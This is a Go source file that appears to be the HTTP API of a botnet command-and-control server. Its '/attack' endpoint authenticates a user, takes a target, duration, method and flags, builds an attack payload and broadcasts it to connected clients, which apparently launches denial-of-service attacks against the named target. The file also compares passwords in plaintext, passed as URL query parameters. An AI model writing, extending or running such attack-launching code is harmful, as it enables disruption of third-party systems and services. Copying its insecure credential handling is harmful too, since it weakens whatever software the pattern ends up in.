package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/gorilla/mux"
)

// NewAPI will create the new API server.
func NewAPI() {
	mux := mux.NewRouter()
	mux.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
		type Result struct {
			Success bool `json:"success"`
			Error string `json:"error"`
			Target string `json:"target"`
			Duration string `json:"duration"`
			Method string `json:"method"`
			Flags map[string]string `json:"flags"`
		}
		
		// Checks for missing parameters needed
		if !r.URL.Query().Has("user") || !r.URL.Query().Has("password") || !r.URL.Query().Has("target") || !r.URL.Query().Has("duration") || !r.URL.Query().Has("method") {
			w.WriteHeader(http.StatusBadRequest)
			response, err := json.Marshal(&Result{Success: false, Error: "missing required parameters"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		// FindUser will return the user from the database if it was found
		user, err := FindUser(r.URL.Query().Get("user"))
		if err != nil || user == nil {
			w.WriteHeader(http.StatusUnauthorized)
			response, err := json.Marshal(&Result{Success: false, Error: "unknown username"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		} else if user.Password != r.URL.Query().Get("password") {
			w.WriteHeader(http.StatusForbidden)
			response, err := json.Marshal(&Result{Success: false, Error: "unknown password for that user"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		} else if !user.API {
			w.WriteHeader(http.StatusForbidden)
			response, err := json.Marshal(&Result{Success: false, Error: "you don't have api access"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		method, ok := IsMethod(r.URL.Query().Get("method"))
		if !ok || method == nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: "unknown method presented"})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		// Prepares the flags
		flags := make([]string, 0)
		pretty := make(map[string]string)
		for key, item := range r.URL.Query() {
			if _, ok := Flags[key]; !ok || key == "method" {
				continue
			}

			pretty[key] = strings.Join(item, " ")
			flags = append(flags, key + "=" + strings.Join(item, ""))
		}

		attack, err := method.Parse(append([]string{r.URL.Query().Get("method"), r.URL.Query().Get("target"), r.URL.Query().Get("duration")}, flags...), user)
		if err != nil || attack == nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		payload, err := attack.Bytes()
		if err != nil {
			w.WriteHeader(http.StatusOK)
			response, err := json.Marshal(&Result{Success: false, Error: fmt.Sprint(err)})
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			w.Write(response)
			return
		}

		BroadcastClients(payload)
		w.WriteHeader(http.StatusOK)
		response, err := json.Marshal(&Result{Success: true, Target: r.URL.Query().Get("target"), Duration: r.URL.Query().Get("duration"), Method: r.URL.Query().Get("method"), Flags: pretty})
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		w.Write(response)
	})
	
	switch Options.Templates.API.TLS {
	case true: // TLS
		http.ListenAndServeTLS(Options.Templates.API.Listener, Options.Templates.API.Cert, Options.Templates.API.Key, mux)
	default:
		http.ListenAndServe(Options.Templates.API.Listener, mux)
	}
}